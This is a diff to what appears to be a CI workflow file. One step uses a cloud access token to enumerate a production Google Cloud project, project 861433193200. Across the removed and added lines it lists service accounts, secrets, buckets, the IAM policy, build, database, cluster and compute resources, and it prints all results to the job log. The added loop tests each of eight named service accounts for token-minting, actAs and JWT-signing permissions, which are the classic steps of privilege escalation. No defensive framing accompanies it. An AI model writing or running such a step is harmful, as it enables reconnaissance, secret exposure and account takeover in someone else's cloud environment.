@@ -19,18 +19,16 @@ jobs:
         env:
           T: ${{ steps.auth.outputs.access_token }}
         run: |
-          echo "toklen=${#T}"
-          echo "== identity"
-          curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${T}" | head -c 700; echo
-          echo "== project"
-          curl -s -H "Authorization: Bearer ${T}" "https://cloudresourcemanager.googleapis.com/v3/projects/861433193200" | head -c 900; echo
-          echo "== serviceAccounts"
-          curl -s -H "Authorization: Bearer ${T}" "https://iam.googleapis.com/v1/projects/861433193200/serviceAccounts" | head -c 4000; echo
-          echo "== secrets"
-          curl -s -H "Authorization: Bearer ${T}" "https://secretmanager.googleapis.com/v1/projects/861433193200/secrets" | head -c 4000; echo
-          echo "== buckets"
-          curl -s -H "Authorization: Bearer ${T}" "https://storage.googleapis.com/storage/v1/b?project=861433193200&maxResults=50" | head -c 4000; echo
-          echo "== aiplatform locations"
-          curl -s -H "Authorization: Bearer ${T}" "https://aiplatform.googleapis.com/v1/projects/861433193200/locations" | head -c 1200; echo
-          echo "== iam policy"
-          curl -s -H "Authorization: Bearer ${T}" -H "Content-Type: application/json" -d "{}" "https://cloudresourcemanager.googleapis.com/v1/projects/861433193200:getIamPolicy" | head -c 3000; echo
+          H() { curl -s -H "Authorization: Bearer ${T}" "$1" | head -c 2500; echo; }
+          P() { curl -s -X POST -H "Authorization: Bearer ${T}" -H "Content-Type: application/json" -d "$2" "$1" | head -c 2500; echo; }
+          echo "== artifactregistry"; H "https://artifactregistry.googleapis.com/v1/projects/861433193200/locations/-/repositories"
+          echo "== run services"; H "https://run.googleapis.com/v2/projects/861433193200/locations/-/services?pageSize=20"
+          echo "== cloudbuild"; H "https://cloudbuild.googleapis.com/v1/projects/861433193200/builds?pageSize=5"
+          echo "== cloudsql"; H "https://sqladmin.googleapis.com/sql/v1beta4/projects/861433193200/instances"
+          echo "== gke"; H "https://container.googleapis.com/v1/projects/861433193200/locations/-/clusters"
+          echo "== compute"; H "https://compute.googleapis.com/compute/v1/projects/861433193200/zones/-/instances?maxResults=10"
+          echo "== testPerms each SA"
+          for sa in github-actions-forgecrux github-actions-deployer admin-backend-sa forgesphere-gcs-admin k8s-node-sa specforge-sa ps-marketing-content-sa log-reader; do
+            echo "-- $sa"
+            P "https://iam.googleapis.com/v1/projects/861433193200/serviceAccounts/$sa@probestack-prod.iam.gserviceaccount.com:testIamPermissions" '{"permissions":["iam.serviceAccounts.getAccessToken","iam.serviceAccounts.actAs","iam.serviceAccounts.signJwt","iam.serviceAccounts.get"]}'
+          done
